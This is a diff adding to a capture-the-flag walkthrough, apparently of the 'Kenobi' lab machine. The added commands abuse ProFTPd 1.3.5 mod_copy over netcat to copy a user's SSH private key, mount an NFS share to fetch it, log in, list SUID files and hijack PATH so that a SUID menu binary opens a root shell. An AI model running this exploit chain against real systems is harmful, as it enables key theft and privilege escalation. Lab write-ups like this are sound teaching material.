@@ -283,3 +283,64 @@ ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                     | 
 ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                           | exploits/linux/remote/36803.py
 ProFTPd 1.3.5 - File Copy                                                     | exploits/linux/remote/36742.txt
 ```
+Obviously, this version is vulnerable to [SITE CPFR and SITE CPTO commands](http://www.proftpd.org/docs/contrib/mod_copy.html).
+
+```
+nc target 21
+--> 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.121.24]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+--> 350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+--> 250 Copy successful
+```
+
+Now we mount the network share:
+```
+apt install cifs-utils nfs-common #in case this is not installed
+mkdir /mnt/kenobiNFS
+sudo mount target:/var /mnt/kenobiNFS/
+ls -la /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa .
+chmod 600 id_rsa
+ssh-keygen -f "/home/ubuntu/.ssh/known_hosts" -R "target" #in case we get a DNS SPOOFING alert
+ssh kenobi@target -i id_rsa
+```
+
+You can now login through `ssh kenobi@target -i id_rsa`.
+
+First, get the user flag: `cat user.txt`. Afterwards, let's find some sticky bits: `find / -perm -u=s -type f 2>/dev/null`.
+
+One file is standing out: `/usr/bin/menu`, run it.
+
+It gives three option. Let's examine the executable with `strings /usr/bin/menu`.
+
+You will see the corresponding commands:
+```
+curl -I localhost
+uname -r
+ifconfig
+```
+
+Let's try to copy /bin/bash to the local folder and add it to our PATH environment variable so we can overwrite the regular curl command as it is not referenced by an absolute path:
+```
+echo /bin/bash > curl
+chmod 777 curl
+export PATH=/home/kenobi:$PATH
+```
+
+After that we run `/usr/bin/menu` again and choose option `1`:
+```
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@kenobi:~# 
+```
+
+The command the script runs is: `curl -I localhost`. So if we would just `cp /bin/bash ./curl` it would still pass the argument and fail.
+
+Finally, we can get the root flag: `cat /root/root.txt`.
